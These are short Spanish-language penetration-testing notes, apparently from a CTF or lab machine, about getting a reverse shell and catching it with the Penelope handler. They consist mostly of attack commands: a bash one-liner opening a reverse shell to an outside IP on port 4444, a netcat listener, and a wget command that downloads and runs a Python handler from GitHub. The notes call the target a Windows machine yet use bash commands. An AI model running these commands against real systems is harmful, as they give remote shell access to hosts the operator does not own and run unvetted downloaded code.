# Penelope — reverse shell

Notas sueltas de una máquina Windows: subida de una reverse shell y escucha.

## 1. Reverse shell en Bash

Para lanzar una reverse shell desde la víctima hacia nuestro equipo:

```
/bin/bash -i >& /dev/tcp/10.67.169.195/4444 0>&1
```

## 2. Escucha

En nuestro equipo levantamos el listener correspondiente:

```
nc -lvnp 4444
```

## 3. Handler con Penelope

[Penelope](https://github.com/brightio/penelope) es un handler de reverse shells con *hooks* de post-explotación. Se lanza directamente desde GitHub:

```
wget -q https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py && python3 penelope.py
```

> Notas pendientes de completar con el contexto de la máquina.
